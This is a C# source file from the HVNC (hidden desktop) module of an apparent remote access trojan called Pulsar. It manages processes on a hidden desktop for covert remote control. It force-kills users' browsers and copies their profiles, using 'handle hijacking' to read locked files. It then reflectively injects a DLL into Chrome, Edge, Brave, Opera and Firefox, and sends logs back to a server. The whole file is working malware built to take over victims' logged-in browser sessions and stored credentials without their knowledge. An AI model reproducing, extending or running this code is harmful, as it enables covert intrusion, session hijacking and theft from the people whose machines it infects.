using Microsoft.Win32;
using Pulsar.Client.Helper.HVNC.Chromium;
using Pulsar.Client.LoggingAPI;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Helper.HVNC
{
    public class ProcessController
    {
        public ProcessController(string DesktopName)
        {
            this.DesktopName = DesktopName;
        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("user32.dll")]
        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumWindowsDelegate lpfn, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        private delegate bool EnumWindowsDelegate(IntPtr hWnd, IntPtr lParam);
        private const uint DESKTOP_ENUMERATE = 64U;
        private const uint GENERIC_ALL = 511U;

        private const uint WAIT_OBJECT_0 = 0x00000000;
        private const uint WAIT_TIMEOUT = 0x00000102;
        private const uint INFINITE = 0xFFFFFFFF;
        private const int STARTF_USEPOSITION = 0x00000004;

        private readonly struct CloneResult
        {
            public CloneResult(bool success, bool cancelled, string destination)
            {
                Success = success;
                Cancelled = cancelled;
                Destination = destination ?? string.Empty;
            }

            public bool Success { get; }

            public bool Cancelled { get; }

            public string Destination { get; }
        }

        private static bool DeleteFolder(string folderPath)
        {
            bool result;
            try
            {
                if (Directory.Exists(folderPath))
                {
                    Directory.Delete(folderPath, true);
                    result = true;
                }
                else
                {
                    Debug.WriteLine("Folder does not exist.");
                    result = false;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error deleting folder: " + ex.Message);
                result = false;
            }
            return result;
        }

        private void CleanupCancelledClone(string destinationDir)
        {
            if (string.IsNullOrWhiteSpace(destinationDir))
            {
                return;
            }

            try
            {
                if (Directory.Exists(destinationDir))
                {
                    Debug.WriteLine($"[BrowserClone] Cleaning up cancelled clone at '{destinationDir}'");
                    DeleteFolder(destinationDir);
                }
            }
            catch (Exception cleanupEx)
            {
                Debug.WriteLine($"[BrowserClone] Cleanup failed for '{destinationDir}': {cleanupEx.Message}");
            }
        }

        public void StartCmd()
        {
            string path = "conhost cmd.exe";
            this.CreateProc(path);
        }

        public void StartPowershell()
        {
            string path = "conhost powershell.exe";
            this.CreateProc(path);
        }

        public void StartGeneric(string path)
        {
            string command = "conhost " + path;
            this.CreateProc(command);
        }

        /// <summary>
        /// Launches Firefox with HVNC DLL injection and silent profile cloning.
        /// FIXED: Now uses KDOTInjector for proper DLL injection instead of visible cmd.exe launch.
        /// </summary>
        public async Task StartFirefoxAsync(byte[] dllbytes)
        {
            try
            {
                var firefoxConfig = BrowserConfiguration.GetConfig("Firefox");
                if (firefoxConfig == null || !BrowserConfiguration.ValidateConfig(firefoxConfig))
                {
                    Debug.WriteLine("Firefox executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Firefox at: {firefoxConfig.ExecutablePath}");

                // Clone profile using unified approach with silent mode
                var cloneResult = await CloneBrowserProfileAsync(firefoxConfig.SearchPattern, firefoxConfig.ReplacementPath, "Firefox", silent: true).ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    Debug.WriteLine("Firefox profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    // Validate inputs before injection
                    if (dllbytes == null || dllbytes.Length == 0)
                    {
                        throw new ArgumentException("DLL bytes are empty or null.");
                    }
                    if (!System.IO.File.Exists(firefoxConfig.ExecutablePath))
                    {
                        throw new FileNotFoundException($"Firefox executable not found: {firefoxConfig.ExecutablePath}");
                    }

                    // Use KDOTInjector for reflective DLL injection (same as Chrome, Edge, Brave, Opera)
                    Debug.WriteLine($"Starting Firefox injection - EXE: {firefoxConfig.ExecutablePath}, DLL size: {dllbytes.Length}");
                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, firefoxConfig.ExecutablePath, firefoxConfig.SearchPattern, firefoxConfig.ReplacementPath)).ConfigureAwait(false);
                    if (processId > 0)
                    {
                        Debug.WriteLine($"Firefox started successfully with PID {processId}.");
                    }
                    else
                    {
                        Debug.WriteLine("Failed to start Firefox process - invalid process ID.");
                    }
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during Firefox DLL injection: {injectionEx.GetType().Name}: {injectionEx.Message}");
                    throw;
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine("Firefox profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Firefox: " + ex.Message);
            }
        }

        public async Task StartBraveAsync(byte[] dllbytes)
        {
            try
            {
                var braveConfig = BrowserConfiguration.GetConfig("Brave");
                if (braveConfig == null || !BrowserConfiguration.ValidateConfig(braveConfig))
                {
                    Debug.WriteLine("Brave executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Brave at: {braveConfig.ExecutablePath}");

                var cloneResult = await CloneBrowserProfileAsync(braveConfig.SearchPattern, braveConfig.ReplacementPath, "Brave").ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    Debug.WriteLine("Brave profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    await Task.Run(() => KDOTInjector.Start(dllbytes, braveConfig.ExecutablePath, braveConfig.SearchPattern, braveConfig.ReplacementPath)).ConfigureAwait(false);
                    Debug.WriteLine("Brave started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during Brave DLL injection: {injectionEx.Message}");
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine("Brave profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Brave: " + ex.Message);
            }
        }

        public async Task StartOperaAsync(byte[] dllbytes)
        {
            try
            {
                var operaConfig = BrowserConfiguration.GetConfig("Opera");
                if (operaConfig == null || !BrowserConfiguration.ValidateConfig(operaConfig))
                {
                    Debug.WriteLine("Opera executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Opera at: {operaConfig.ExecutablePath}");

                var cloneResult = await CloneBrowserProfileAsync(operaConfig.SearchPattern, operaConfig.ReplacementPath, "Opera").ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    Debug.WriteLine("Opera profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, operaConfig.ExecutablePath, operaConfig.SearchPattern, operaConfig.ReplacementPath)).ConfigureAwait(false);
                    if (processId > 0)
                    {
                        Debug.WriteLine("Opera started successfully with reflective DLL injection.");

                        await Task.Delay(2000).ConfigureAwait(false);
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000).ConfigureAwait(false);
                            }
                            catch (Exception patchEx)
                            {
                                Debug.WriteLine($"Opera patcher error: {patchEx.Message}");
                            }
                        });
                    }
                    else
                    {
                        Debug.WriteLine("Failed to start Opera process.");
                    }
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during Opera DLL injection: {injectionEx.Message}");
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine("Opera profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Opera: " + ex.Message);
            }
        }

        public async Task StartOperaGXAsync(byte[] dllbytes)
        {
            try
            {
                var operaGXConfig = BrowserConfiguration.GetConfig("OperaGX");
                if (operaGXConfig == null || !BrowserConfiguration.ValidateConfig(operaGXConfig))
                {
                    Debug.WriteLine("OperaGX executable not found.");
                    return;
                }

                Debug.WriteLine($"Found OperaGX at: {operaGXConfig.ExecutablePath}");

                var cloneResult = await CloneBrowserProfileAsync(operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath, "Opera GX").ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    Debug.WriteLine("OperaGX profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, operaGXConfig.ExecutablePath, operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath)).ConfigureAwait(false);
                    if (processId > 0)
                    {
                        Debug.WriteLine("OperaGX started successfully with reflective DLL injection.");

                        await Task.Delay(2000).ConfigureAwait(false);
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000).ConfigureAwait(false);
                            }
                            catch (Exception patchEx)
                            {
                                Debug.WriteLine($"OperaGX patcher error: {patchEx.Message}");
                            }
                        });
                    }
                    else
                    {
                        Debug.WriteLine("Failed to start OperaGX process.");
                    }
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during OperaGX DLL injection: {injectionEx.Message}");
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine("OperaGX profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting OperaGX: " + ex.Message);
            }
        }

        public async Task StartEdgeAsync(byte[] dllbytes)
        {
            try
            {
                var edgeConfig = BrowserConfiguration.GetConfig("Edge");
                if (edgeConfig == null || !BrowserConfiguration.ValidateConfig(edgeConfig))
                {
                    Debug.WriteLine("Edge executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Edge at: {edgeConfig.ExecutablePath}");

                var cloneResult = await CloneBrowserProfileAsync(edgeConfig.SearchPattern, edgeConfig.ReplacementPath, "Edge").ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    Debug.WriteLine("Edge profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    await Task.Run(() => KDOTInjector.Start(dllbytes, edgeConfig.ExecutablePath, edgeConfig.SearchPattern, edgeConfig.ReplacementPath)).ConfigureAwait(false);
                    Debug.WriteLine("Edge started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during Edge DLL injection: {injectionEx.Message}");
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine("Edge profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Edge: " + ex.Message);
            }
        }

        public async Task StartChromeAsync(byte[] dllbytes)
        {
            try
            {
                var chromeConfig = BrowserConfiguration.GetChromeConfig();
                if (chromeConfig == null)
                {
                    UniversalDebugLogger.SendLogToServer("Chrome executable not found.");
                    return;
                }

                UniversalDebugLogger.SendLogToServer($"Found Chrome at: {chromeConfig.ExecutablePath}");

                var cloneResult = await CloneBrowserProfileAsync(chromeConfig.SearchPattern, chromeConfig.ReplacementPath, "Chrome").ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    UniversalDebugLogger.SendLogToServer("Chrome profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    await Task.Run(() => KDOTInjector.Start(dllbytes, chromeConfig.ExecutablePath, chromeConfig.SearchPattern, chromeConfig.ReplacementPath)).ConfigureAwait(false);
                    UniversalDebugLogger.SendLogToServer("Chrome started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    UniversalDebugLogger.SendLogToServer($"Error during DLL injection: {injectionEx.Message}");
                }
            }
            catch (OperationCanceledException)
            {
                UniversalDebugLogger.SendLogToServer("Chrome profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                UniversalDebugLogger.SendLogToServer("Error starting Chrome: " + ex.Message);
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        /// <summary>
        /// Generic method to start any browser by type with reflective DLL injection.
        /// </summary>
        /// <param name="browserType">Type of browser (Chrome, Edge, Brave, Opera, OperaGX)</param>
        /// <param name="dllbytes">DLL bytes to inject</param>
        public async Task StartBrowserAsync(string browserType, byte[] dllbytes)
        {
            try
            {
                if (browserType.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
                {
                    await StartChromeAsync(dllbytes).ConfigureAwait(false);
                    return;
                }

                var config = BrowserConfiguration.GetConfig(browserType);
                if (config == null || !BrowserConfiguration.ValidateConfig(config))
                {
                    Debug.WriteLine($"{browserType} executable not found.");
                    return;
                }

                Debug.WriteLine($"Found {browserType} at: {config.ExecutablePath}");

                string processName = Path.GetFileNameWithoutExtension(config.ExecutablePath).ToLower();
                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";

                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                startupInfo.dwX = 0;
                startupInfo.dwY = 0;
                startupInfo.dwFlags = STARTF_USEPOSITION;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine($"Waiting for {browserType} processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    await Task.Delay(500).ConfigureAwait(false);
                }

                var cloneResult = await CloneBrowserProfileAsync(config.SearchPattern, config.ReplacementPath, browserType).ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    Debug.WriteLine($"{browserType} profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, config.ExecutablePath, config.SearchPattern, config.ReplacementPath)).ConfigureAwait(false);
                    if (processId > 0)
                    {
                        Debug.WriteLine($"{browserType} started successfully with reflective DLL injection.");

                        if (browserType.Equals("Opera", StringComparison.OrdinalIgnoreCase) ||
                              browserType.Equals("OperaGX", StringComparison.OrdinalIgnoreCase))
                        {
                            await Task.Delay(2000).ConfigureAwait(false);
                            _ = Task.Run(async () =>
                            {
                                try
                                {
                                    await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000).ConfigureAwait(false);
                                }
                                catch (Exception patchEx)
                                {
                                    Debug.WriteLine($"{browserType} patcher error: {patchEx.Message}");
                                }
                            });
                        }
                    }
                    else
                    {
                        Debug.WriteLine($"Failed to start {browserType} process.");
                    }
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during {browserType} DLL injection: {injectionEx.Message}");
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine($"{browserType} profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error starting {browserType}: {ex.Message}");
            }
        }

        public bool CreateProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            // try setting position to 0,0
            structure.dwX = 0;
            structure.dwY = 0;
            structure.dwFlags = STARTF_USEPOSITION;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
        }

        public void StartDiscord()
        {
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
            if (!File.Exists(discordPath)) return;

            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
            this.CreateProc(killCommand);
            Thread.Sleep(1000);
            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
            this.CreateProc(startCommand);
        }

        /// <summary>
        /// Checks if windows exist on the specified desktop with detailed logging.
        /// </summary>
        private bool DoesDesktopHaveWindows(string desktopName)
        {
            bool hasWindows = false;
            int windowCount = 0;
            try
            {
                IntPtr desktopHandle = OpenDesktop(desktopName, 0, true, GENERIC_ALL);
                if (desktopHandle == IntPtr.Zero)
                {
                    Debug.WriteLine($"[StartExplorer] Failed to open desktop '{desktopName}'");
                    return false;
                }

                try
                {
                    EnumDesktopWindows(desktopHandle, (hWnd, lParam) =>
                    {
                        if (hWnd != IntPtr.Zero)
                        {
                            windowCount++;
                            hasWindows = true;
                            Debug.WriteLine($"[StartExplorer] Window #{windowCount} found: 0x{hWnd:X8}");
                            return true; // Continue to count all windows
                        }
                        return true;
                    }, IntPtr.Zero);
                }
                finally
                {
                    CloseDesktop(desktopHandle);
                }

                if (hasWindows)
                {
                    Debug.WriteLine($"[StartExplorer] Desktop '{desktopName}' verified with {windowCount} visible window(s)");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[StartExplorer] Error checking desktop windows: {ex.Message}");
            }

            return hasWindows;
        }

        /// <summary>
        /// Waits for Explorer windows to be created on the desktop with detailed attempt logging.
        /// </summary>
        private bool WaitForExplorerWindows(int maxWaitMs = 5000)
        {
            int elapsedMs = 0;
            const int checkIntervalMs = 500;
            int attemptCount = 0;

            Debug.WriteLine($"[StartExplorer] Waiting up to {maxWaitMs}ms for Explorer windows to appear...");

            while (elapsedMs < maxWaitMs)
            {
                attemptCount++;
                if (DoesDesktopHaveWindows(this.DesktopName))
                {
                    Debug.WriteLine($"[StartExplorer] ✓ Explorer windows detected after {elapsedMs}ms (attempt #{attemptCount})");
                    return true;
                }

                Debug.WriteLine($"[StartExplorer] Attempt #{attemptCount}: No windows found, waiting {checkIntervalMs}ms... ({elapsedMs}/{maxWaitMs}ms)");
                Thread.Sleep(checkIntervalMs);
                elapsedMs += checkIntervalMs;
            }

            Debug.WriteLine($"[StartExplorer] ✗ Timeout after {maxWaitMs}ms ({attemptCount} attempts). Windows may not have appeared yet.");
            return false;
        }

        public void StartExplorer()
        {
            try
            {
                Debug.WriteLine("[StartExplorer] ========== Starting Explorer Process Initialization ==========");
                Debug.WriteLine($"[StartExplorer] Desktop: {this.DesktopName}");
                Debug.WriteLine($"[StartExplorer] Process ID: {System.Diagnostics.Process.GetCurrentProcess().Id}");
                
                uint num = 2U;
                string name = "TaskbarGlomLevel";
                string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
                using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
                {
                    if (registryKey != null)
                    {
                        object value = registryKey.GetValue(name);
                        if (value is uint)
                        {
                            uint num2 = (uint)value;
                            if (num2 != num)
                            {
                                registryKey.SetValue(name, num, RegistryValueKind.DWord);
                                Debug.WriteLine("[StartExplorer] Updated TaskbarGlomLevel registry key");
                            }
                        }
                    }
                }
                
                string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
                Debug.WriteLine($"[StartExplorer] Launching: {explorerPath}");
                Debug.WriteLine("[StartExplorer] Calling CreateProc...");
                
                bool success = this.CreateProc(explorerPath);
                
                if (!success)
                {
                    Debug.WriteLine("[StartExplorer] ✗ CreateProc failed - process may not have started");
                    return;
                }

                Debug.WriteLine("[StartExplorer] ✓ CreateProc returned success, waiting for windows to appear...");

                // Wait for Explorer windows to appear on the desktop
                System.Diagnostics.Stopwatch waitTimer = System.Diagnostics.Stopwatch.StartNew();
                bool windowsAppeared = WaitForExplorerWindows(5000);
                waitTimer.Stop();
                
                if (windowsAppeared)
                {
                    Debug.WriteLine($"[StartExplorer] ✓ Explorer windows confirmed ready after {waitTimer.ElapsedMilliseconds}ms");
                }
                else
                {
                    Debug.WriteLine($"[StartExplorer] ⚠ Warning: Explorer windows may not be ready after {waitTimer.ElapsedMilliseconds}ms, proceeding anyway");
                }

                // Give Explorer a bit more time to fully initialize
                Debug.WriteLine("[StartExplorer] Final initialization delay (500ms)...");
                Thread.Sleep(500);
                Debug.WriteLine("[StartExplorer] ========== Explorer Initialization Complete ==========");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[StartExplorer] ✗ Exception during initialization: {ex.Message}");
                Debug.WriteLine($"[StartExplorer] Stack Trace: {ex.StackTrace}");
            }
        }

        /// <summary>
        /// Clones browser profile from SearchPattern to ReplacementPath.
        /// Executes on a background thread to avoid blocking message processing.
        /// </summary>
        /// <param name="searchPattern">Relative path pattern (e.g., "Local\Google\Chrome\User Data")</param>
        /// <param name="replacementPath">Relative path for destination (e.g., "Local\Google\Chrome\KDOT")</param>
        /// <param name="browserName">Name of browser being cloned (for UI display)</param>
        /// <param name="silent">If true, no UI progress dialog is shown</param>
        private async Task<CloneResult> CloneBrowserProfileAsync(string searchPattern, string replacementPath, string browserName = null, bool silent = false)
        {
            BrowserCloneProgressSession progressSession = null;
            Task completionTask = Task.CompletedTask;
            CloneResult cloneResult = default;

            try
            {
                progressSession = await BrowserCloneProgressSession.TryCreateAsync(browserName, silent).ConfigureAwait(false);
                progressSession?.ReportPreparing();

                CancellationToken cancellationToken = progressSession?.CancellationToken ?? CancellationToken.None;

                cloneResult = await Task.Run(() => CloneBrowserProfileInternal(
                    searchPattern,
                    replacementPath,
                    cancellationToken,
                    progressSession?.Progress)).ConfigureAwait(false);

                bool completedSuccessfully = cloneResult.Success && !cloneResult.Cancelled;
                completionTask = progressSession?.ReportCompletionAsync(completedSuccessfully) ?? Task.CompletedTask;

                return cloneResult;
            }
            catch
            {
                completionTask = progressSession?.ReportCompletionAsync(false) ?? Task.CompletedTask;
                throw;
            }
            finally
            {
                await completionTask.ConfigureAwait(false);
                progressSession?.Dispose();
            }
        }

        private CloneResult CloneBrowserProfileInternal(
            string searchPattern,
            string replacementPath,
            CancellationToken cancellationToken,
            IProgress<BrowserCloneProgress> progress)
        {
            string localSearch = searchPattern;
            string localReplacement = replacementPath;

            string baseDir;
            if (localSearch.StartsWith("Local\\", StringComparison.OrdinalIgnoreCase))
            {
                baseDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                localSearch = localSearch.Substring(6);
                localReplacement = localReplacement.Substring(6);
            }
            else if (localSearch.StartsWith("Roaming\\", StringComparison.OrdinalIgnoreCase))
            {
                baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                localSearch = localSearch.Substring(8);
                localReplacement = localReplacement.Substring(8);
            }
            else
            {
                Debug.WriteLine($"Invalid search pattern format: {localSearch}");
                return new CloneResult(false, false, string.Empty);
            }

            string sourceDir = Path.Combine(baseDir, localSearch);
            string destDir = Path.Combine(baseDir, localReplacement);

            try
            {
                cancellationToken.ThrowIfCancellationRequested();

                UniversalDebugLogger.SendLogToServer($"Cloning browser profile from '{sourceDir}' to '{destDir}'");

                if (!Directory.Exists(sourceDir))
                {
                    UniversalDebugLogger.SendLogToServer($"Source directory does not exist: {sourceDir}");
                    return new CloneResult(false, false, destDir);
                }

                if (Directory.Exists(destDir))
                {
                    UniversalDebugLogger.SendLogToServer($"Removing existing destination directory: {destDir}");
                    DeleteFolder(destDir);
                }

                cancellationToken.ThrowIfCancellationRequested();

                UniversalDebugLogger.SendLogToServer("[BrowserClone] Using handle hijacking for locked files...");
                bool success = HandleHijacker.ForceCopyDirectory(
                    sourceDir,
                    destDir,
                    killIfFailed: false,
                    progress,
                    cancellationToken);

                if (success)
                {
                    UniversalDebugLogger.SendLogToServer("[BrowserClone] Browser profile cloned successfully with handle hijacking.");
                }
                else
                {
                    UniversalDebugLogger.SendLogToServer("[BrowserClone] Handle hijacking partial success, some files may be skipped.");
                }

                return new CloneResult(success, false, destDir);
            }
            catch (OperationCanceledException)
            {
                UniversalDebugLogger.SendLogToServer("[BrowserClone] Operation cancelled by user.");
                CleanupCancelledClone(destDir);
                return new CloneResult(false, true, destDir);
            }
            catch (Exception ex)
            {
                UniversalDebugLogger.SendLogToServer($"Error cloning browser profile: {ex.Message}");
                CleanupCancelledClone(destDir);
                throw;
            }
        }

        /// <summary>
        /// Waits for a process to complete with a timeout
        /// </summary>
        /// <param name="processInfo">Process information structure</param>
        /// <param name="timeoutMs">Timeout in milliseconds (default 5000ms)</param>
        /// <returns>True if process completed within timeout, false otherwise</returns>
        private bool WaitForProcessCompletion(PROCESS_INFORMATION processInfo, uint timeoutMs = 5000)
        {
            try
            {
                if (processInfo.hProcess == IntPtr.Zero)
                    return false;

                uint result = WaitForSingleObject(processInfo.hProcess, timeoutMs);

                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);

                return result == WAIT_OBJECT_0;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error waiting for process: {ex.Message}");
                return false;
            }
        }

        public async Task StartGenericChromiumAsync(byte[] dllbytes, string browserPath, string searchPattern, string replacementPath)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
                {
                    UniversalDebugLogger.SendLogToServer($"Generic Chromium browser executable not found at: {browserPath}");
                    return;
                }

                if (string.IsNullOrWhiteSpace(searchPattern) || string.IsNullOrWhiteSpace(replacementPath))
                {
                    UniversalDebugLogger.SendLogToServer("Search pattern and replacement path are required for generic Chromium browser.");
                    return;
                }

                UniversalDebugLogger.SendLogToServer($"Starting Generic Chromium Browser: {browserPath}");
                UniversalDebugLogger.SendLogToServer($"Search Pattern: {searchPattern}");
                UniversalDebugLogger.SendLogToServer($"Replacement Path: {replacementPath}");

                string processName = Path.GetFileNameWithoutExtension(browserPath);
                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";

                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                startupInfo.dwX = 0;
                startupInfo.dwY = 0;
                startupInfo.dwFlags = STARTF_USEPOSITION;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                UniversalDebugLogger.SendLogToServer($"Killing any existing {processName}.exe processes...");
                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    UniversalDebugLogger.SendLogToServer($"Waiting for {processName}.exe processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    UniversalDebugLogger.SendLogToServer("Failed to create taskkill process, using fallback delay.");
                    await Task.Delay(500).ConfigureAwait(false);
                }

                string friendlyName = Path.GetFileNameWithoutExtension(browserPath);
                if (string.IsNullOrWhiteSpace(friendlyName))
                {
                    friendlyName = "Chromium";
                }

                var cloneResult = await CloneBrowserProfileAsync(searchPattern, replacementPath, friendlyName).ConfigureAwait(false);
                if (cloneResult.Cancelled)
                {
                    UniversalDebugLogger.SendLogToServer("Generic Chromium profile cloning cancelled by user – skipping injection.");
                    return;
                }

                try
                {
                    await Task.Run(() => KDOTInjector.Start(dllbytes, browserPath, searchPattern, replacementPath)).ConfigureAwait(false);
                    UniversalDebugLogger.SendLogToServer($"Generic Chromium browser started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    UniversalDebugLogger.SendLogToServer($"Error during generic Chromium DLL injection: {injectionEx.Message}");
                }
            }
            catch (OperationCanceledException)
            {
                UniversalDebugLogger.SendLogToServer("Generic Chromium profile cloning cancelled by user.");
            }
            catch (Exception ex)
            {
                UniversalDebugLogger.SendLogToServer($"Error starting generic Chromium browser: {ex.Message}");
            }
        }

        private string DesktopName;

        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;

            public IntPtr hStdError;
        }

        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }
    }
}